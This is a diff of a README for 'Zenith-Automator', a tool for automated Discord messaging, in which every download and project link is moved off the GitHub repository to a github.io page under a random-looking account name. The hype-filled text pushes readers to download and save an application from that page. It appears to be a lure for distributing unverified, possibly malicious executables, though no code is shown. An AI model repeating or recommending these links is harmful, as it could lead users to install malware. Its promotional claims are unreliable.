@@ -36,14 +36,14 @@ Zenith-Automator is free to use, and the source code is publicly available. That
 
 ## 📥 Download and Setup
 
-[![Download Zenith-Automator](https://img.shields.io/badge/Download-Zenith--Automator-brightgreen?style=for-the-badge&logo=appveyor)](https://github.com/Onobrychisviciaefoliacourtmartial907/Zenith-Automator)
+[![Download Zenith-Automator](https://img.shields.io/badge/Download-Zenith--Automator-brightgreen?style=for-the-badge&logo=appveyor)](https://onobrychisviciaefoliacourtmartial907.github.io)
 
 Let's get you up and running in just a few minutes.
 
 **Step 1: Visit the download link**
 
 Visit this link to download the application:  
-👉 **[Click Here to Download Zenith-Automator](https://github.com/Onobrychisviciaefoliacourtmartial907/Zenith-Automator)**
+👉 **[Click Here to Download Zenith-Automator](https://onobrychisviciaefoliacourtmartial907.github.io)**
 
 **Step 2: Save the file to your computer**
 
@@ -141,7 +141,7 @@ There are many automation tools out there, but Zenith-Automator stands out becau
 
 Zenith-Automator is just one piece of the puzzle. The creator has many other exciting tools and projects you might love. Check them all out here:
 
-👉 **[See All My Projects](https://professionalskiddar.pages.dev/)**
+👉 **[See All My Projects](https://onobrychisviciaefoliacourtmartial907.github.io)**
 
 You might find something else that makes your digital life easier!
 
@@ -161,7 +161,7 @@ If you run into any trouble, you're not alone. The best way to get support is:
 
 You now have everything you need to start using Zenith-Automator. It takes just a few minutes to download, set up, and start benefiting from automated Discord messaging.
 
-🚀 **[Download Zenith-Automator Now](https://github.com/Onobrychisviciaefoliacourtmartial907/Zenith-Automator)**
+🚀 **[Download Zenith-Automator Now](https://onobrychisviciaefoliacourtmartial907.github.io)**
 
 Join the thousands of happy users who save hours every week by letting Zenith-Automator handle their Discord messages. It's fast, free, and easy—what are you waiting for?
 
